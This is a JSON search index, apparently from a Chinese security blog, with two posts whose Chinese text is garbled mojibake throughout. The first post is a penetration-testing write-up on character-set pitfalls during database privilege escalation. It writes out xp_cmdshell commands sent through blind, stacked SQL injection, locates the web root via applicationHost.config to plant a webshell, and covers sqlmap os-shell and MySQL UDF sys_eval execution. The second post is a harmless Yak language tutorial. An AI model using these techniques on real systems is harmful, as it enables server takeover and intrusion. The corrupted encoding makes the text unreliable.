[{"title":"æ•°æ®åº“ææƒä¸­çš„å­—ç¬¦é›†æŒ‘æˆ˜","path":"/posts/5ae37a88/","content":"åœ¨æ•°æ®åº“æ¸—é€æµ‹è¯•ä¸­ï¼ŒæˆåŠŸè·å–æ•°æ®åº“æƒé™åï¼Œä¸‹ä¸€æ­¥å¾€å¾€æ˜¯é€šè¿‡æ•°æ®åº“ææƒæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿›è€Œè·å¾—æ›´é«˜çº§åˆ«çš„ç³»ç»Ÿè®¿é—®æƒé™ã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦é›†å…¼å®¹æ€§é—®é¢˜ç»å¸¸è¢«å¿½è§†ï¼Œäºæ˜¯ä¾¿æœ‰äº†æœ¬ç¯‡æ–‡ç« ã€‚ æœ¬ç¯‡æ–‡ç« ä»¥Windowsä¸­æ–‡ç¯å¢ƒä¸‹MSSQLå’ŒMySQLä¸¤ç§æ•°æ®åº“ææƒä¸ºæ¡ˆä¾‹ å‰è¨€æ•°æ®åº“ææƒè°ƒç”¨æ— è®ºæ˜¯MSSQLè¿˜æ˜¯MySQLï¼Œå½“æˆ‘ä»¬é€šè¿‡æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œå®é™…ä¸Šéƒ½æ˜¯åœ¨è°ƒç”¨æ“ä½œç³»ç»Ÿçš„å‘½ä»¤è¡Œæ¥å£ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œpingå‘½ä»¤æ—¶ï¼š MSSQL .xitzapubekic{zoom:50%;} MySQL: .bheghxbmnibl{zoom: 50%;} åœ¨ææƒè¿‡ç¨‹ä¸­æ‰€æœ‰çš„ç³»ç»Ÿå‘½ä»¤æœ€ç»ˆéƒ½è¦é€šè¿‡æ“ä½œç³»ç»Ÿçš„å‘½ä»¤è¡Œè§£é‡Šå™¨æ¥æ‰§è¡Œã€‚åœ¨ä¸­æ–‡Windowsç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œææƒä¾¿è°ƒç”¨äº†cmd.exe å­—ç¬¦é›†WindowsæŸ¥è¯¢å‘½ä»¤è¡Œè§£é‡Šå™¨çš„å­—ç¬¦é›† chcp å‘½ä»¤ ä¾‹å¦‚ï¼Œè¿™é‡Œçš„ä»£ç é¡µ 936 è¡¨ç¤ºç®€ä½“ä¸­æ–‡ï¼ˆGB2312ï¼‰ cmdç¨‹åºå±æ€§ .hruiaonrhmdi{zoom:50%;} åœ¨ä¸­æ–‡Windowsç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œcmd.exeé»˜è®¤ä½¿ç”¨GBKå­—ç¬¦é›†è¿›è¡Œè¾“å…¥è¾“å‡ºå¤„ç†ï¼Œè¿™æ„å‘³ç€ï¼š ä»æ•°æ®åº“ä¼ é€’ç»™cmdçš„å‘½ä»¤å‚æ•°å¿…é¡»æ˜¯GBKç¼–ç  cmdæ‰§è¡Œç»“æœçš„è¾“å‡ºä¹Ÿæ˜¯GBKç¼–ç  å¦‚æœå­—ç¬¦é›†ä¸åŒ¹é…ï¼Œå°±ä¼šå‡ºç°ä¹±ç æˆ–å‘½ä»¤æ‰§è¡Œå¤±è´¥ æ’å‘æŒ‡å—æ¥ä¸‹æ¥ä»‹ç»åœ¨æ¸—é€è¿‡ç¨‹ç”±äºGBKå­—ç¬¦é›†é‡åˆ°ä»¥ä¸‹æƒ…å†µçš„è§£å†³åŠæ³• å‘½ä»¤å‚æ•°åŒ…å«ä¸­æ–‡è·¯å¾„æ—¶æ‰§è¡Œå¤±è´¥ è¾“å‡ºç»“æœä¹±ç æ— æ³•æ­£ç¡®è§£æ â€¦â€¦ .ouvgwtdghviz{zoom:50%;} MSSQLç›²æ³¨ææƒç¯å¢ƒèƒŒæ™¯åœ¨é’ˆå¯¹åŸºäºIIS + ASP.NET + MSSQLæ¶æ„çš„Webåº”ç”¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œå‘ç°å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œç¯å¢ƒæƒ…å†µå¦‚ä¸‹: æ³¨å…¥ç±»å‹: å¸ƒå°”ç›²æ³¨ã€å †å æ³¨å…¥ ç¯å¢ƒé™åˆ¶: ä¸å‡ºç½‘ã€ä»…æš´éœ²80443ç«¯å£ æƒé™çŠ¶å†µ: æ•°æ®åº“ç”¨æˆ·ä¸ºsysadminï¼Œæ‰§è¡Œå‘½ä»¤æƒé™ä¸ºnt authority\\system ç³»ç»Ÿç¯å¢ƒ: ä¸­æ–‡Windows Server ä¸ºäº†åç»­æ–¹ä¾¿å†…ç½‘æ¸—é€éœ€è¦å†™å…¥ä¸€ä¸ªWebshell æµç¨‹å¤§ä½“æµç¨‹å¦‚ä¸‹ï¼š åˆ›å»ºä¸´æ—¶è¡¨å­˜å‚¨å‘½ä»¤æ‰§è¡Œç»“æœ åˆ©ç”¨å †å æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå°†ç»“æœæ’å…¥ä¸´æ—¶è¡¨ é€šè¿‡ç›²æ³¨è·å–ç½‘ç«™ç‰©ç†è·¯å¾„ å†™å…¥Webshellåˆ°ç½‘ç«™ç›®å½• å¯»æ‰¾ç½‘ç«™æ ¹è·¯å¾„æ ¹æ®æƒé™çº§åˆ«ï¼Œæˆ‘ä»¬æœ‰ä¸åŒçš„å‘½ä»¤é€‰æ‹©ï¼š é«˜æƒé™æƒ…å†µä¸‹ï¼š c:\\windows\\system32\\inetsrv\\appcmd list vdirtype C:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config | find physicalPath ä¸€èˆ¬æƒé™æƒ…å†µä¸‹ï¼š dir C:\\ /s /b | find [æ›¿æ¢ä¸ºç½‘ç«™å·²æœ‰çš„é™æ€æ–‡ä»¶] è¸©å‘01ï¼šå¯»æ‰¾ç½‘ç«™æ ¹è·¯å¾„ä¸­æ–‡è·¯å¾„çš„ä¹±ç é—®é¢˜ é—®é¢˜ç°è±¡: åŒ…å«ä¸­æ–‡è·¯å¾„çš„é…ç½®æ— æ³•æ­£ç¡®æ˜¾ç¤ºï¼Œè¿”å›çš„ç»“æœå‡ºç°ä¹±ç ã€‚ å½“æˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ—¶ï¼š exec master..xp_cmdshell type C:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config | find \\physicalPath\\ æ ¹æœ¬åŸå› : applicationHost.configæ–‡ä»¶ä½¿ç”¨UTF-8ç¼–ç ä¿å­˜ï¼Œä½†CMDä½¿ç”¨GBKå­—ç¬¦é›†è§£ç ï¼Œå¯¼è‡´ä¸­æ–‡å­—ç¬¦æ˜¾ç¤ºä¸ºä¹±ç  è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨CyberChefç­‰å·¥å…·ï¼Œé€šè¿‡â€Encode textâ€ â†’ â€œEncode textâ€çš„recipeæ¥æ¢å¤æ­£ç¡®çš„ä¸­æ–‡å­—ç¬¦ã€‚ ç›²æ³¨ä¸­çš„éASCIIå­—ç¬¦å¤„ç†åœ¨SQL Serverä¸­ï¼ŒASCII()å‡½æ•°æ— æ³•æ­£ç¡®å¤„ç†éASCIIå­—ç¬¦ï¼š SELECT ASCII(P) AS [ASCII], ASCII(ä¸­) AS [Chinese]; .suqiryxjpdjs{zoom:67%;} å¯ä»¥çœ‹åˆ°ASCII()å‡½æ•°æ— æ³•æ­£ç¡®æ˜ å°„éASCIIå­—ç¬¦åˆ°æ­£ç¡®çš„å­—ç¬¦ç ä½ SELECT NCHAR(80) AS [CHARACTER], NCHAR(214) AS [CHARACTER]; .xrwxnmihkudl{zoom:50%;} è§£å†³æ€è·¯1 - ä½¿ç”¨UNICODEå‡½æ•°ï¼š UNICODEå‡½æ•°æ”¯æŒè¿”å›æ­£ç¡®çš„å­—ç¬¦ç ä½ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨å®ƒæ¥æ‰¾åˆ°éASCIIå­—ç¬¦çš„æ­£ç¡®ç ä½ã€‚å¹¶å¯é€šè¿‡NCHARå‡½æ•°æ¢å¤ä¸ºå­—ç¬¦ SELECT UNICODE(ä¸­) AS [Unicode_Value]; .lszrjymqvtml{zoom:50%;} SELECT NCHAR(20013) AS [Character]; .hfcxddehbdwt{zoom:50%;} è§£å†³æ€è·¯2 - åå…­è¿›åˆ¶è½¬æ¢ï¼š SELECT CONVERT ( VARCHAR (MAX), CONVERT ( varbinary (MAX), ( SELECT entry_value FROM daily_back WHERE id = 1 ) ), 2 ); è¿™ç§æ–¹æ³•å°†ä¸­æ–‡å­—ç¬¦è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œé€šè¿‡ç›²æ³¨é€ä¸ªå­—èŠ‚è¯»å–ï¼Œå†é€šè¿‡CyberChefæ¢å¤åŸå§‹å­—ç¬¦ã€‚ sqlmap os-shell.fybbtvkbufrf{zoom:50%;} é‚£æˆ‘ç”¨SQLMAPå°±æ²¡å•¥å‘äº†å§ï¼Ÿæœ‰çš„å…„å¼Ÿæœ‰çš„ ä½¿ç”¨sqlmapçš„os-shellåŠŸèƒ½æ—¶ï¼ŒåŒæ ·ä¼šé‡åˆ°å­—ç¬¦é›†é—®é¢˜ï¼Œå‡ºç°ä¸­æ–‡ä¼šæ‰§è¡Œå¤±è´¥ï¼š .ujyoeytkedtm{zoom:50%;} ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè¡¥å……ä¸ªå‚æ•°--proxy http://127.0.0.1:8080ï¼Œç”¨bpæŠ“ä¸ªåŒ…åˆ†æä¸€ä¸‹ ä¾æ—§æ‰§è¡Œdir C:\\inetpub\\ä¸­æ–‡è·¯å¾„ å‘½ä»¤ è§£ç å¾—åˆ° DECLARE @gqxz VARCHAR(8000);SET @gqxz=0x64697220433a5c696e65747075625ce4b8ade69687e8b7afe5be84;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @gqxz-- å°†0x64697220433a5c696e65747075625ce4b8ade69687e8b7afe5be84é€šè¿‡CyberChefè§£ç ä¸€ä¸‹ï¼Œå‘ç°æ˜¯é»˜è®¤çš„UTF8ç¼–ç çš„å‘½ä»¤ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°åŒ…å«ä¸­æ–‡çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥åŸå› ä¸ºï¼šSQLMAPçš„os-shellä¼šè‡ªåŠ¨å°†å­—ç¬¦å‡ºä½¿ç”¨UTF8ç¼–ç ï¼Œå¹¶ç›´æ¥è¾“å…¥xp_cmdshell ä½†CMDä½¿ç”¨GBKè§£ç å¯¼è‡´ä¹±ç ï¼Œæ‰§è¡Œå¤±è´¥ è§£å†³åŠæ³•: é‡åˆ°åŒ…å«ä¸­æ–‡çš„å‘½ä»¤æ—¶ï¼Œæ”¹ç”¨sqlmapçš„sql-shellç›´æ¥æ‰§è¡Œï¼š exec master..xp_cmdshell xxxxx MySQL UDFææƒè¾“å‡ºç»“æœç¼–ç é”™è¯¯åœ¨ä¸­æ–‡Windowsç¯å¢ƒä¸‹MySQL UDFææƒä¸­ï¼Œæœ€å¸¸è§çš„é—®é¢˜æ˜¯æ‰§è¡Œç»“æœçš„ç¼–ç é—®é¢˜ï¼š SELECT sys_eval(dir E:\\\\); .trkuizofbkls{zoom: 50%;} å¯¹åº”çš„è§£å†³åŠæ³•å¾ˆç®€å•ï¼Œudfå‡½æ•°å¤–åŠ ä¸€å±‚ç¼–ç è½¬åŒ–çš„å‡½æ•° SELECT CONVERT(sys_eval(dir E:\\\\) USING gbk); .oisubqmpfluj{zoom: 50%;} å‘½ä»¤ä¸­çš„éASCIIå­—ç¬¦å¤„ç†å½“å‘½ä»¤å‚æ•°åŒ…å«ä¸­æ–‡ï¼Œç”±äºMySQLè¾“å…¥ä¼šæ ¹æ®é»˜è®¤å­—ç¬¦é›†(utf8mb4latin1)ç¼–ç å¯¹åº”çš„å‘½ä»¤è¿›å…¥å‘½ä»¤è¡Œè§£é‡Šå™¨ SELECT CONVERT(sys_eval(dir E:\\\\é™„ä»¶) USING gbk); .splxfxypvbzn{zoom:50%;} è§£å†³æ–¹æ¡ˆ æ–¹æ³•1 - åå…­è¿›åˆ¶ç¼–ç : ä½¿ç”¨CyberChefå°†å‘½ä»¤è½¬æ¢ä¸ºå¯¹åº”ç¼–ç çš„åå…­è¿›åˆ¶ .iwktbwggvbev{zoom:50%;} ç„¶åä½¿ç”¨åå…­è¿›åˆ¶æ›¿ä»£åŸæœ‰çš„å­—ç¬¦ä¸²ï¼Œé˜²æ­¢MySQLå› ä¸ºé»˜è®¤ç¼–ç é—®é¢˜å¯¼è‡´çš„å«æœ‰ä¸­æ–‡å‘½ä»¤æ‰§è¡Œé”™è¯¯é—®é¢˜ .ybjcxdtdwibg{zoom:50%;} æ–¹æ³•2 - ç¼–ç å‡½æ•°: æ—¢ç„¶åˆæ˜¯ç¼–ç é—®é¢˜ï¼Œé‚£å†æ¬¡ä½¿ç”¨MySQLçš„ç¼–ç è½¬åŒ–çš„å‡½æ•°ä¸å°±å¥½äº†å—ï¼Ÿä½•å¿…è½¬æˆ16è¿›åˆ¶è¿™ä¹ˆéº»çƒ¦ SELECT CONVERT(sys_eval(CONVERT(dir E:\\\\é™„ä»¶ USING gbk)) USING gbk); .shtdqgkflbvd{zoom:50%;} æ€»ç»“æ€»æ˜¯é‡åˆ°è¿™ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ã€‚ã€‚ã€‚ã€‚ å­—ç¬¦é›†é—®é¢˜åœ¨æ•°æ®åº“æ¸—é€æµ‹è¯•ä¸­å¾€å¾€è¢«å¿½è§†ï¼Œåœ¨Windowsç¯å¢ƒä¸‹åº”å½“æ ¼å¤–æ³¨æ„","tags":["database","character"],"categories":["penetration"]},{"title":"Yakitæ’ä»¶å¼€å‘","path":"/posts/72baa392/","content":"Yakè¯­è¨€åŸºç¡€ Yakitä½¿ç”¨çš„æ˜¯Yakè¯­è¨€ï¼Œæ‰€ä»¥åœ¨å†™æ’ä»¶ä¹‹å‰éœ€è¦å­¦ä¹ ä¸€ä¸‹Yakè¯­è¨€ï¼ˆæ„Ÿè§‰æ¯”è¾ƒåƒPythonå’ŒJavaScriptï¼‰ å˜é‡ä¸æ•°æ®ç±»å‹å˜é‡Yakä¸­èµ‹å€¼ç¬¦ä¸ºï¼š= å®šä¹‰å˜é‡ ä½¿ç”¨varä½œä¸ºå…³é”®è¯ï¼Œvaråä½¿ç”¨ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦å³å¯å®šä¹‰å˜é‡ var a // å£°æ˜å˜é‡avar b, c // å£°æ˜å˜é‡bå’Œcvar d, e = 1, 2 // å£°æ˜å˜é‡då’Œeï¼Œå¹¶åˆ†åˆ«èµ‹å€¼ä¸º1å’Œ2 åœ¨æ²¡æœ‰varä¿®é¥°çš„æ—¶å€™ï¼Œèµ‹å€¼ç¬¦â€œâ€ä¼šä¸ºå·¦è¾¹çš„â€œæ ‡è¯†ç¬¦â€è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå˜é‡ åŸºç¡€æ•°æ®ç±»å‹ intï¼šè¡¨ç¤ºå¯ä»¥å¸¦æ­£è´Ÿå·çš„æ•´æ•°æ•°æ®ç±»å‹ï¼ˆåœ¨Yakè¯­è¨€ä¸­å ç”¨çš„å¤§å°ä¸º64ä½ï¼‰ï¼› stringï¼šç”¨äºè¡¨ç¤ºä¸€ç³»åˆ—å­—ç¬¦æ•°æ®çš„ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ï¼Œä¾‹å¦‚ ç­‰ï¼› floatï¼šç”¨äºè¡¨ç¤ºæµ®ç‚¹æ•°ï¼› byteï¼šç­‰åŒäºâ€œæ— ç¬¦å·8ä½æ•´æ•°â€ï¼Œé€šå¸¸ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªâ€œå­—èŠ‚â€ï¼Œç±»ä¼¼Cè¯­è¨€ä¸­çš„Charç±»å‹ï¼› nilä¸undefinedä¸€èˆ¬ç”¨äºè¡¨ç¤ºä¸€ä¸ªæœªå®šä¹‰çš„å˜é‡æˆ–è€…ç©ºå€¼ï¼› boolï¼šè¡¨ç¤ºâ€œå¸ƒå°”å€¼â€ï¼Œå…¶å€¼åªæœ‰ä¸¤ç§æƒ…å†µï¼Œtrueæˆ–falseï¼› Tips: å£°æ˜ä¸€ä¸ªéåè¿›åˆ¶çš„æ•´æ•° // äºŒè¿›åˆ¶å£°æ˜a = 0b10\t// aèµ‹å€¼2// å…«è¿›åˆ¶å£°æ˜b = 0100\t// bèµ‹å€¼64// åå…­è¿›åˆ¶å£°æ˜d = 0x10\t// dèµ‹å€¼16 å¤šè¡Œæ–‡æœ¬ å¯ä»¥ä½¿ç”¨``(åå¼•å·)æ¥å®šä¹‰å¤šè¡Œæ–‡æœ¬ï¼Œæ­¤æ—¶ä¼šå¿½ç•¥æ–‡æœ¬ä¸­çš„è½¬ä¹‰ç¬¦å· abc = `Hello World Hello Yak`println(abc)/*Output:Hello World Hello Yak*/ æ ¼å¼åŒ–å­—ç¬¦ä¸² Yakè¯­è¨€ä½¿ç”¨%è¿›è¡ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–ã€‚æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸¤ç§ç”¨æ³•å’Œæ“ä½œåŸºæœ¬è¯­æ³•ï¼š printfå‡½æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°ä¸ºéœ€è¦æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²æ¨¡ç‰ˆï¼Œå…¶ä½™å‚æ•°ä¸ºä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å‚æ•°ï¼› %æ ¼å¼åŒ–æ“ä½œç¬¦ï¼š %å·¦è¾¹ä¸ºéœ€è¦æ ¼å¼åŒ–çš„æ¨¡ç‰ˆï¼Œå³è¾¹ä¸ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼Œä¾‹å¦‚ Hello %v % Worldï¼› å¦‚æœæœ‰å¤šä¸ªéœ€è¦æ ¼å¼åŒ–çš„ç‚¹ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨ []æ¥åŒ…è£¹ï¼Œå¹¶ç”¨é€—å·åˆ†éš”å…ƒç´ ï¼Œä¾‹å¦‚ï¼šMy name is %v, I am %d years old % [John, 18]ã€‚ ç¤ºä¾‹ï¼š printf(Hello I am %d years old , 18)println(Hello %v + %05d % [World, 4])/*OUTPUT:Hello I am 18 years oldHello World + 00004*/ æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ è§£é‡Š %v æ ¹æ®å˜é‡çš„ç±»å‹è‡ªåŠ¨é€‰æ‹©æ ¼å¼ã€‚ %T è¾“å‡ºå˜é‡çš„ç±»å‹ã€‚ %d åè¿›åˆ¶æ•´æ•°ã€‚ %b äºŒè¿›åˆ¶æ•´æ•°ã€‚ %o å…«è¿›åˆ¶æ•´æ•°ã€‚ %x åå…­è¿›åˆ¶æ•´æ•°ï¼Œä½¿ç”¨å°å†™å­—æ¯ã€‚ %X åå…­è¿›åˆ¶æ•´æ•°ï¼Œä½¿ç”¨å¤§å†™å­—æ¯ã€‚ %f æµ®ç‚¹æ•°ï¼Œä¸å¸¦æŒ‡æ•°éƒ¨åˆ†ã€‚ %c ASCIIç å¯¹åº”çš„å­—ç¬¦ã€‚ %q å¸¦å¼•å·çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚ %s å­—ç¬¦ä¸²ã€‚ %p è¾“å‡ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„å†…å­˜åœ°å€æˆ–å¼•ç”¨ã€‚ å­—ç¬¦ä¸²æ¨¡ç‰ˆå­—é¢é‡ â€‹\tç±»ä¼¼äºPythonï¼Œåœ¨å­—ç¬¦ä¸²çš„å‰é¢åŠ ä¸Šä¸€ä¸ªå°å†™çš„ fï¼Œç„¶ååœ¨å­—ç¬¦ä¸²å†…éƒ¨ç”¨ $ åŒ…è£¹éœ€è¦æ’å…¥çš„è¡¨è¾¾å¼ã€‚ ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²ä¸­æ’å…¥å˜é‡ a å’Œ name çš„å€¼ã€‚ println(f`Hello $a, Hello $name`) å…¶ä»–æ•°æ®ç±»å‹åˆ—è¡¨ç±»å‹ï¼šListåœ¨ Yak è¯­è¨€ä¸­ï¼ŒList æ˜¯ä¸€ç§åŠ¨æ€æ•°ç»„ï¼Œå®ƒå¯ä»¥å­˜å‚¨å’Œç®¡ç†ç›¸åŒç±»å‹çš„å…ƒç´ ã€‚Yak è¯­è¨€æ”¯æŒå­—é¢é‡å£°æ˜å’Œ make è¯­æ³•æ¥åˆ›å»º List å­—é¢é‡åˆ›å»ºåˆ—è¡¨ï¼šä½¿ç”¨ [var1, var2, var3...] å½¢å¼å¿«é€Ÿå£°æ˜ä¸€ä¸ª Listã€‚Yak è¯­è¨€ä¼šæ ¹æ®åˆ—è¡¨å†…çš„å…ƒç´ ç±»å‹è‡ªåŠ¨æ¨æ–­åˆé€‚çš„ List ç±»å‹ã€‚ **å­—å…¸ç±»å‹ï¼š**mapå­—å…¸ç”¨äºå­˜å‚¨é”®å€¼å¯¹ å­—é¢é‡åˆ›å»ºå­—å…¸ç¤ºä¾‹ï¼š m = a: 1, b: 2 **é€šé“ç±»å‹ï¼š**channelé€šé“ç±»å‹ç”¨äºå¤šçº¿ç¨‹ä¹‹é—´çš„æ•°æ®å…±äº« åˆ›å»ºä¸å£°æ˜ï¼šä½¿ç”¨makeå‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„channelã€‚è¿™å°±åƒæ˜¯å¼€è®¾ä¸€ä¸ªæ–°çš„é‚®å±€ï¼Œç”¨äºå‘é€å’Œæ¥æ”¶åŒ…è£¹ã€‚ ch := make(chan int) // åˆ›å»ºä¸€ä¸ªæ²¡æœ‰å­˜å‚¨ç©ºé—´çš„intç±»å‹çš„channelch2 := make(chan var, 2) // åˆ›å»ºä¸€ä¸ªæœ‰2ä¸ªå­˜å‚¨ç©ºé—´çš„varç±»å‹çš„channel æ•°æ®å†™å…¥ ch - 1 // å°†ä¸€ä¸ªæ•´æ•°1å¯„å‡ºåˆ°chï¼Œä½†æ˜¯å› ä¸º ch åœ¨ä¸Šæ–‡åˆ›å»ºæ—¶æ²¡æœ‰å£°æ˜å­˜å‚¨ç©ºé—´ï¼Œè¿™é‡Œä¼šé˜»å¡ch2 - a // å°†ä¸€ä¸ªå­—ç¬¦ä¸²å¯„å‡ºåˆ°ch2ch2 - 0 // å°†ä¸€ä¸ªæ•´æ•°0å¯„å‡ºåˆ°ch2 è¯»å–æ•°æ® v := -ch // ä»chå–èµ°ä¸€ä¸ªåŒ…è£¹ Tipsï¼šåˆ¤æ–­æ•°æ®æ˜¯å¦å–èµ° v, ok := -chif ok println(å–èµ°æˆåŠŸï¼Œå€¼ä¸º:, v) else println(é‚®å±€å·²å…³é—­) Channelçš„å±æ€§ Yakæä¾›äº†ä¸€äº›å†…ç½®çš„å‡½æ•°æ¥æ£€æŸ¥channelçš„å½“å‰çŠ¶æ€ã€‚ len(ch2) // æŸ¥çœ‹ch2ä¸­è¿˜æœ‰å¤šå°‘ä¸ªåŒ…è£¹cap(ch2) // æŸ¥çœ‹ch2æœ€å¤šèƒ½å­˜æ”¾å¤šå°‘ä¸ªåŒ…è£¹ å…³é—­Channel å…³é—­åçš„channelä¸èƒ½å†å¯„å‡ºæ•°æ®ï¼Œä½†ä»ç„¶å¯ä»¥ä»ä¸­å–èµ°æ•°æ®ã€‚ close(ch2) è¿ç®—ç¬¦æ•°å­¦è¿ç®—æ•°å­¦è¿ç®—åŒ…æ‹¬åŠ ã€å‡ã€ä¹˜ã€é™¤å’Œå–ä½™ç­‰æ“ä½œï¼š println(2 + 2) // è¾“å‡º: 4println(50 - 5*6) // è¾“å‡º: 20println(8 / 5) // è¾“å‡º: 1println(17 % 3) // è¾“å‡º: 2 é€»è¾‘è¿ç®—ç¬¦é€»è¾‘è¿ç®—ç¬¦åœ¨Yakè¯­è¨€ä¸­ç”¨äºè¿›è¡Œé€»è¾‘æ“ä½œï¼ŒåŒ…æ‹¬é€»è¾‘ä¸()å’Œé€»è¾‘æˆ–(||) è¿™ä¸¤ä¸ªè¿ç®—ç¬¦éƒ½å…·æœ‰çŸ­è·¯ç‰¹æ€§ï¼Œå³å¦‚æœå·¦ä¾§çš„æ“ä½œæ•°å·²ç»èƒ½ç¡®å®šæ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå†è®¡ç®—å³ä¾§çš„æ“ä½œæ•° a = trueb = falseprintln(a b) // è¾“å‡ºï¼šfalseprintln(a || b) // è¾“å‡ºï¼štrue ä¸‰å…ƒé€»è¾‘è¿ç®—ç¬¦å½¢å¼ä¸ºcondition ? value1 : value2 å¦‚æœconditionä¸ºçœŸï¼Œåˆ™è¡¨è¾¾å¼çš„ç»“æœä¸ºvalue1ï¼Œå¦åˆ™ä¸ºvalue2ã€‚è¿™ä¸ªè¿ç®—ç¬¦ä¹Ÿå…·æœ‰çŸ­è·¯ç‰¹æ€§ï¼Œå³å¦‚æœæ¡ä»¶å·²ç»èƒ½ç¡®å®šæ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå†è®¡ç®—å…¶ä»–çš„å€¼ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä½¿ç”¨ç¤ºä¾‹ï¼š a = 5b = 3result = a b ? a : bprintln(result) // è¾“å‡ºï¼š5 æ§åˆ¶ä¸å¾ªç¯ è¿™éƒ¨åˆ†æ¯”è¾ƒåƒPythonï¼Œç›´æ¥å†™ç¤ºä¾‹å°±å¥½äº† æ¡ä»¶åˆ¤æ–­ç¤ºä¾‹ï¼š x = 88; // å­¦ç”Ÿçš„æˆç»©if x = 90 print(éå¸¸ä¼˜ç§€); else if x = 80 print(ä¼˜ç§€); else if x = 70 print(è‰¯å¥½); else if x = 60 print(æ™®é€š); else print(ä¸åŠæ ¼); SWITCH è¯­å¥ç¤ºä¾‹ï¼š grade = Bswitch (grade) case A: println(ä¼˜ç§€); case B: println(è‰¯å¥½); case C: println(åˆæ ¼); case D: println(éœ€è¦åŠªåŠ›); default: println(æ— æ•ˆçš„æˆç»©); æ­¤å¤–ï¼Œswitchå…è®¸ä¸€ä¸ªcaseåˆ†æ”¯åŒ¹é…å¤šä¸ªå€¼ Forå¾ªç¯å®šä¹‰ï¼š for è¡¨è¾¾å¼1 ; è¡¨è¾¾å¼2 ; è¡¨è¾¾å¼3 å¾ªç¯ä½“ é¦–å…ˆè¿è¡Œè¡¨è¾¾å¼1 - åˆ¤æ–­è¡¨è¾¾å¼2ï¼Œå¦‚æœæˆç«‹åˆ™è¿è¡Œå¾ªç¯ä½“ä¸­çš„ä»£ç  - æ¯ä¸€æ¬¡å¾ªç¯åæ‰§è¡Œè¡¨è¾¾å¼3 - è¿›è¡Œè¡¨è¾¾å¼2çš„åˆ¤æ–­å¹¶å¾ªç¯æ‰§è¡Œï¼Œç›´åˆ°è¡¨è¾¾å¼2åˆ¤æ–­ä¸ºå‡ï¼Œåˆ™ç»“æŸæ•´ä¸ªå‡½æ•°ã€‚ TIPSï¼š ç®€åŒ–çš„Forå¾ªç¯ å¯¹äºæ— åˆå§‹åŒ–è¡¨è¾¾å¼å’Œæ¯æ¬¡å¾ªç¯åçš„è¿­ä»£è¡¨è¾¾å¼çš„forå¾ªç¯ï¼Œå¯ä»¥å†™ä¸ºï¼š for å¸ƒå°”è¡¨è¾¾å¼ å¾ªç¯ä½“ éå†åˆ—è¡¨ ä½¿ç”¨for-rangeä¸ä½¿ç”¨for-inæ•ˆæœç›¸åŒ for i, v = range a println(i, v)//ç­‰åŒäºfor v in a println(v)/*OUTPUT:0 a1 b2 c3 d*/ i, væ˜¯æˆ‘ä»¬åœ¨æ¯æ¬¡è¿­ä»£ä¸­å®šä¹‰çš„ä¸¤ä¸ªå˜é‡ï¼Œå…¶ä¸­iå°†å­˜å‚¨å½“å‰çš„ç´¢å¼•ï¼Œè€Œvå°†å­˜å‚¨ä¸è¯¥ç´¢å¼•å¯¹åº”çš„å€¼ï¼ˆè‹¥åªè¿­ä»£ä¸€ä¸ªå˜é‡ï¼Œè¿­ä»£çš„å€¼å°†ä¼šæ˜¯ç´¢å¼•ï¼‰ã€‚ range aæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªä»é›†åˆaä¸­æå–ç´¢å¼•å’Œå€¼çš„èŒƒå›´ã€‚ éå†å­—å…¸ ä½¿ç”¨for-rangefor-inéå†å­—å…¸ï¼Œè¿™æ ·å¯ä»¥åŒæ—¶è·å–é”®å’Œå€¼ï¼š for k, v = range b printf(%s:%d, , k, v)//ç­‰åŒäºfor k, v in b printf(%s:%d, , k, v) åœ¨è¿™ä¸ªå¾ªç¯ä¸­ï¼Œkå’Œvåˆ†åˆ«åœ¨æ¯æ¬¡è¿­ä»£æ—¶è¢«èµ‹äºˆå­—å…¸ä¸­çš„é”®å’Œå¯¹åº”çš„å€¼ 